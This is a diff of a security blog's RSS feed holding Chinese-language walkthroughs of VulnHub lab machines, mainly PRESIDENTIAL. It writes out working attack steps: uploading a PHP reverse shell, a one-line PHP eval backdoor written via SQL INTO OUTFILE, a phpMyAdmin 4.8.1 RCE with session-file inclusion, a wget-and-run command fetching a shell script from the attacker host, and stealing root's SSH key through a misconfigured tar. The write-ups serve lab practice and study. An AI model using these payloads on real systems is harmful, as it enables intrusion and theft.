-&lt;p&gt;可以控制 ftp 服务向靶机发送 payload，判断是否能上传到网站&lt;br&gt;
- &lt;code&gt;cp /usr/share/webshells/php/php-reverse-shell.php .&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;修改监听 ip 地址和端口号为攻击机&lt;br&gt;
- &lt;code&gt;cat shell.php | head -n 55 | tail -n 10&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;连接 ftp，put shell.php 上传文件，打开网址发现 exp 上传成功&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-574.png&#34; width=&#34;370&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;点击运行即可成功收到会话，也可以上传一句话木马，使用蚁剑连接&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-575.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
-&lt;h3 id=&#34;md5-解密&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#md5-解密&#34;&gt;#&lt;/a&gt; MD5 解密&lt;/h3&gt;
-&lt;p&gt;查看目录下 important.txt 文件，发现根目录有可执行脚本，运行一下&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-577.png&#34; width=&#34;320&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;解密这个 md5，得到 onion。猜测这是 ssh 的登录密码&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-578.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;h3 id=&#34;sudopython3提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sudopython3提权&#34;&gt;#&lt;/a&gt; sudo (python3) 提权&lt;/h3&gt;
-&lt;p&gt;su shrek 依靠 onion 密码登陆 ssh 成功&lt;br&gt;
-这里使用 python 进行提权，得到 root 身份运行的 shell&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-579.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
- ]]></description>
-        </item>
-        <item>
             <guid isPermalink="true">http://www.n1h1l157.live/2021/11/01/VULNHUB/127%20TYPO/</guid>
             <title>VULNHUB 27 TYPO</title>
             <link>http://www.n1h1l157.live/2021/11/01/VULNHUB/127%20TYPO/</link>
@@ -989,6 +879,116 @@ get CALL.html&lt;/p&gt;
 &lt;img data-src=&#34;/N1h1l157/VULNHUB/image-721.png&#34; width=&#34;450&#34; alt=&#34;Image&#34;&gt;
 &lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;执行&lt;span class=&#34;built_in&#34;&gt;id&lt;/span&gt;的时候发现属于docker组，尝试用docker提权&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;docker run -v /:/mnt --rm -it alpine chroot /mnt sh&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;调整shell输出比较美观的shell&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;SHELL=/bin/bash script -q /dev/null&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
 &lt;img data-src=&#34;/N1h1l157/VULNHUB/image-722.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;-&amp;gt; 成功拿到了 root 权限&lt;/p&gt;
+ ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">http://www.n1h1l157.live/2021/11/01/VULNHUB/129%20PRESIDENTIAL/</guid>
+            <title>VULNHUB 29 PRESIDENTIAL</title>
+            <link>http://www.n1h1l157.live/2021/11/01/VULNHUB/129%20PRESIDENTIAL/</link>
+            <category>VULNHUB 21-30</category>
+            <pubDate>Mon, 01 Nov 2021 00:00:00 +0800</pubDate>
+            <description><![CDATA[ &lt;p&gt;靶机下载地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvcHJlc2lkZW50aWFsLTEsNTAwLw==&#34;&gt;https://www.vulnhub.com/entry/presidential-1,500/&lt;/span&gt;&lt;/p&gt;
+&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
+&lt;p&gt;攻击机 KALI： 192.168.31.135&lt;br&gt;
+ 靶机 PRESIDENTIAL：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
+&lt;p&gt;1 ）确定靶机 ip 地址&lt;br&gt;
+ &lt;code&gt;sudo arp-sacn -l&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-723.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;-&amp;gt; 靶机 ip：192.168.0.153&lt;/p&gt;
+&lt;p&gt;2 ）确认靶机 ip 开放的端口信息&lt;br&gt;
+ &lt;code&gt;sudo nmap -p 192.168.0.153&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-724.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;-&amp;gt; 靶机开放端口 21,2082&lt;/p&gt;
+&lt;p&gt;发现了一个比较奇怪的端口，用 nmap 扫描其详细信息，发现是 ssh 服务&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-725.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
+&lt;h3 id=&#34;网站信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#网站信息收集&#34;&gt;#&lt;/a&gt; 网站信息收集&lt;/h3&gt;
+&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMC4xNTM=&#34;&gt;http://192.168.0.153&lt;/span&gt; 进行信息收集&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-726.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;没有明显发现，对其目录结构进行扫描&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-727.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;查看目录:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMC4xNTMvY29uZmlnLnBocA==&#34;&gt;http://192.168.0.153/config.php&lt;/span&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-728.png&#34; width=&#34;320&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;查看目录:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMC4xNTMvY29uZmlnLnBocC5iYWs=&#34;&gt;http://192.168.0.153/config.php.bak&lt;/span&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-729.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;-&amp;gt; 发现了数据库的账户名密码 votebox:casoj3FFASPsbyoRP&lt;/p&gt;
+&lt;p&gt;但是没有数据库的端口开通，发现没法利用，查看 80 端口的网站，看能否找到更多敏感的信息，发现了一个域名，我们就用这个域名做 DNS 解析指向其 ip 地址&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-730.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;修改本地 hosts 文件，指定规则如下&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-731.png&#34; width=&#34;320&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;访问 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3ZvdGVub3cubG9jYWw=&#34;&gt;http://votenow.local&lt;/span&gt; 成功显示出来该网站&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-732.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;做一波目录扫描，发现和原 ip 的扫描内容一模一样&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-733.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
+&lt;h3 id=&#34;wfuzz-扫描子域名&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#wfuzz-扫描子域名&#34;&gt;#&lt;/a&gt; wfuzz 扫描子域名&lt;/h3&gt;
+&lt;p&gt;既然是域名，何不进行一波子域名的收集，用 subDomainsBrute 爆破子域名&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;python subDomainsBrute.py votenow.local&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-734.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;但是没有扫描到任何目录，需要注意的是我们去识别此域名的子域名，其解析的 ip 地址依然要指向靶机的 IP 地址&lt;/p&gt;
+&lt;p&gt;用 wfuzz 来枚举子域名&lt;br&gt;
+ &lt;code&gt;wfuzz -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -H &amp;quot;Host: FUZZ.votenow.local&amp;quot; --hw 854 --hc 400 votenow.local&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;通过这种方法收集的子域名的解析地址都是目标靶机的 ip&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-735.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;将扫描到的子域名加入到本地 hosts 文件中&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-736.png&#34; width=&#34;390&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;访问网站 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2RhdGFzYWZlLnZvdGVub3cubG9jYWw=&#34;&gt;http://datasafe.votenow.local&lt;/span&gt; , 输入之前泄漏的数据库账户密码&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-737.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;-&amp;gt; 拿到 phpmyadmin 的权限&lt;/p&gt;
+&lt;h3 id=&#34;phpmyadmin后台写shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#phpmyadmin后台写shell&#34;&gt;#&lt;/a&gt; phpmyadmin 后台写 shell&lt;/h3&gt;
+&lt;p&gt;点击 SQL，尝试执行敏感的 sql 语句，写入 webshell&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-738.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;显示目录&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;show variables like &amp;#x27;%datadir%&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;select @@basedir;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-739.png&#34; width=&#34;380&#34; alt=&#34;Image&#34;&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;数据库当前操作用户拥有写权限：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;show global variables like &amp;#x27;%secure_file_priv%&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-740.png&#34; width=&#34;380&#34; alt=&#34;Image&#34;&gt;
+&lt;ul&gt;
+&lt;li&gt;secure_file_priv 参数：&lt;br&gt;
+&lt;strong&gt;NULL 不允许导入或导出；/tmp 只允许在 /tmp 目录导入导出；空 不限制目录&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;写入一句话后门：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;select &amp;#x27;&amp;lt;?php @eval($_POST[&amp;#x27;x&amp;#x27;]);?&amp;gt;&amp;#x27; INTO OUTFILE &amp;#x27;/var/lib/mysql/a.php&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-741.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;写入失败，可能被过滤掉了，找到密码，看能否修改密码进行破解&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-742.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;用 john 破解密码破解失败（此密码应能破解，破解为 Stella）admin:Stella&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-743.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
+&lt;h3 id=&#34;phpmyadmin-漏洞提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#phpmyadmin-漏洞提权&#34;&gt;#&lt;/a&gt; phpmyadmin 漏洞提权&lt;/h3&gt;
+&lt;p&gt;接下来可以看一下这个 phpmyadmin 的版本是多少，如果较低的话是可以直接利用现成的 payload 进行提权的&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-744.png&#34; width=&#34;680&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;通过 searchsploit 搜索 phpmyadmin4.8.1 找到了 RCE 漏洞的 payload&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-745.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;将 paylaod 复制到一个目录下，查阅后开始利用&lt;br&gt;
+ &lt;code&gt;python 50457.py datasafe.votenow.local 80 / votebox casoj3FFASPsbyoRP whoami&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-746.png&#34; width=&#34;550&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;根据代码内容输入命令之后没有报错说明可以正常使用此 payload, 修改代码中的拿到权限后的执行的操作，让其反弹 shell&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-747.png&#34; width=&#34;680&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;但是依然没有反弹 shell 成功，需要进行手动复现&lt;/p&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;在SQL语句上写入执行反弹shell的代码&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;select &amp;#x27;&amp;lt;?php system(&amp;quot;wget 192.168.0.152/shell.sh; chmod +x shell.sh; bash shell.sh&amp;quot;);exit;?&amp;gt;&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-748.png&#34; width=&#34;550&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;写入恶意 payload 成功后，拿取到此页面保存的 cookie 的值&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-749.png&#34; width=&#34;550&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;同时需要在 kali 机器上准备好反弹 shell 的代码，等待靶机执行&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-750.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;访问如下网址，最后的后缀是页面的 cookie 的值，成功拿到网站权限&lt;br&gt;
+ &lt;code&gt;http://datasafe.votenow.local/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/session/sess_q6brk6uh6kbpb5t9888v47b3epgcoltl&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-751.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-752.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;-&amp;gt; 成功拿到了 apache 用户的网站权限&lt;/p&gt;
+&lt;h3 id=&#34;恶意tar命令提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#恶意tar命令提权&#34;&gt;#&lt;/a&gt; 恶意 tar 命令提权&lt;/h3&gt;
+&lt;p&gt;搜索一下有没有相关文件的权限设置错误&lt;br&gt;
+ &lt;code&gt;find / -group admin 2&amp;gt;/dev/null | grep -v &#39;proc\|home&#39;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;发现找到一个 admin 组下的一个命令 tarS&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-753.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;查看 /etc/passwd 确认我们能提权的账户有哪些  &lt;code&gt;cat /etc/passwd | grep bash&lt;/code&gt; &lt;br&gt;
+ 发现有 admin 和 root 两个账户都存在 bash&lt;br&gt;
+john 破解 phpmyadmin 后台时可得到 admin:Stella, &lt;code&gt;su admin&lt;/code&gt;  尝试提权&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-754.png&#34; width=&#34;370&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;确认一下 admin 用户下是否有某些可执行文件的特权&lt;/p&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;find&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;find / -group admin 2&amp;gt;/dev/null | grep -v &amp;#x27;proc\|home&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/usr/bin/tarS -cvf key.tar /root/.ssh/id_rsa&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;tar -xvf key.tar&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;用此有错误权限的 tarS 命令去压缩并解压 root 账户下的 ssh 私钥&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-755.png&#34; width=&#34;570&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;将私钥文件发送到自己的 kali 机器上，修改权限为 600 ，进行连接需要注意目标机器的 ssh 开放在了 2082 端口&lt;br&gt;
+ &lt;code&gt;ssh -p 2082 root@192.168.0.154 -i root/.ssh/id_rsa&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-756.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
 &lt;p&gt;-&amp;gt; 成功拿到了 root 权限&lt;/p&gt;
  ]]></description>
         </item>
